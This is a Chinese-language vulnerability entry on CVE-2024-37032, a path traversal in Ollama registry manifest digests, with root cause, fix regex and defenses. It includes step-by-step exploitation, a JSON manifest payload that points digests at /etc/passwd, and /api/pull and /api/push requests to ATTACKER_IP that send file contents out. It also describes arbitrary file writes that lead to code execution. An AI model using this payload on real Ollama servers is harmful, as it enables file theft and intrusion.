---
id: ai-security-supply-chain-ollama-digest-path-traversal-file-read-write
title: Ollama 恶意 registry manifest digest 路径遍历实现任意文件读取与写入（CVE-2024-37032）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: registry-manifest-digest-path-traversal
aliases:
- Probllama
- Ollama digest 路径遍历
- 恶意 registry manifest 路径穿越
tags:
- ollama
- path-traversal
- registry
- manifest
- arbitrary-file-read
- arbitrary-file-write
cve: CVE-2024-37032
affected_versions: < 0.1.34
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
artifact: knowledge/ai-security/supply-chain/ai-security-supply-chain-ollama-digest-path-traversal-file-read-write.md
verification:
  verified_by: verifier-T1-34
  verified_at: '2026-11-08T18:05:31+08:00'
  notes: 已对照原文核对：affected_versions「< 0.1.34」为原文第14行影响范围原样标记；digest路径遍历链(rogue registry manifest→GetBlobsPath未校验→/api/pull读/api/push回传)与img01修复commit diff、img02 /etc/passwd回传证据均佐证；源码级原理(sha256格式未校验)与修复分析原文完整
---

## 一句话结论

对未授权暴露的 Ollama（< 0.1.34），攻击者可通过 /api/pull 指向 rogue registry，在 manifest 的 digest 字段中注入路径遍历序列，使服务端按 digest 构建本地 blobs 路径时越出 blobs 目录，实现任意文件读取（配合 /api/push 将文件内容回传攻击者）与任意文件写入。

## 原理

漏洞位于 ollama/modelpath.go 的 GetBlobsPath：该函数把 digest 仅做 `:`→`-` 替换后直接 filepath.Join 到 models/blobs 目录下，既未校验 digest 是否为 64 位十六进制的 SHA256 格式，也未过滤 `../`。Ollama 遵循 Docker Registry API 从外部 registry 拉取模型：/api/pull 接受 name 指向攻击者服务器（insecure: true 可绕过 TLS 校验），服务端信任 registry 返回的 manifest，digest 字段被原样拼接进文件路径，路径遍历序列在解析时生效，使读写范围越过 blobs 目录到达文件系统任意位置。/api/push 会将本地 blob（即被遍历读取的文件内容）上传回攻击者的 registry，形成完整外带回传。

## 触发条件

- 目标运行 Ollama < 0.1.34，且 API 端口（默认 11434）对攻击者可达、无认证；
- 攻击者可控一台恶意 registry 服务器（rogue registry）用于返回特制 manifest 并接收上传。

## 利用步骤

1. 搭建 rogue registry（如 FastAPI 服务），在 /v2/<name>/manifests/latest 返回 schemaVersion 2 的 manifest，其中 config.digest 与 layers[].digest 填入路径遍历 payload（如 ../../../../../../../../../../../etc/passwd），mediaType 使用 application/vnd.ollama.image.license 等合法类型，size 设小值；
2. 向目标发送 POST /api/pull，body 为 {"name":"<攻击者IP>/<repo>/<model>","insecure":true}；Ollama 拉取 manifest 并按 digest 构建路径，把遍历指向的文件当作 blob 获取/暂存；
3. 向目标发送 POST /api/push（同名模型），触发 Ollama 将本地 blob 内容经 PATCH /v2/.../blobs/uploads/... 上传到攻击者服务器，回显读取到的文件内容（如 /etc/passwd 全文）；
4. 写方向：digest 指向任意目标路径时，服务端 os.MkdirAll 会按遍历后的路径建目录，写入的 blob 内容落到攻击者指定位置，可进一步落马实现代码执行。

## PoC

最小复现（rogue registry 返回体）：

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "digest": "../../../../../../../../../../../../../etc/passwd",
    "size": 10
  },
  "layers": [
    {
      "mediaType": "application/vnd.ollama.image.license",
      "digest": "../../../../../../../../../../../../../etc/passwd",
      "size": 10
    }
  ]
}
```

配合 POST /api/pull {"name":"ATTACKER_IP/rogue/model","insecure":true} 与 POST /api/push 同名请求即可完成读取并回传。漏洞环境：docker run -v ollama:/root/.ollama -p 11434:11434 ollama/ollama:0.1.33。

## 变体与关联

- 未修复版本还可通过 digest 指向不存在的文件（如 /tmp/notfoundfile）探测文件存在性；
- 同类缺陷模式：外部 registry/上游返回的结构化字段（digest、路径、URL）未做格式校验即参与本地文件路径构建；
- 修复版本 0.1.34 在 GetBlobsPath 增加 `^sha256[:-][0-9a-fA-F]{64}$` 正则校验，非 SHA256 格式 digest 直接拒绝。

## 检测与防御

- 升级 Ollama 至 0.1.34 及以上；
- 不要把 11434 端口暴露公网，防火墙/网络分段限制访问；/api/pull、/api/push 应仅允许可信 registry 来源；
- 监测出站行为：Ollama 服务向外部 IP 发起 uploads/PATCH 上传是异常信号；
- 服务端对一切参与文件路径构建的外部字段（digest、tag、name）做严格格式白名单校验，拒绝包含 `..`、`/` 的输入。
